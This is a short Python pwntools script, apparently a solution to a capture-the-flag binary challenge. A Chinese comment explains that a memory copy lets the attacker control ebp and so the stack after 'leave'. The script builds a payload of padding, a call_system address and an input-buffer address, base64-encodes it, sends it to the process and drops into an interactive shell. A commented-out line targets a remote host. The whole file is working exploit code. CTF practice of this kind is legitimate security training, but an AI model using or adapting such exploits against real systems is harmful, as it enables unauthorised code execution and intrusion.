from pwn import *
import base64
'''
080492BA处的内存拷贝影响了ebp，ebp可控，
ebp可控后，可让leave后栈顶内容可控
'''


ph = process("deeef094fc4d4a1fb957b40d91061ea3") 
#ph = remote("111.198.29.45",48239)
#io = zio('./login') 
raw_input()
gdb.attach(ph)
ph.readuntil(':')
call_system = 0x08049284
input_addr = 0x811eb40
payload = 'aaaa' + p32(call_system) + p32(input_addr)

ph.sendline(base64.b64encode(payload))
ph.interactive()
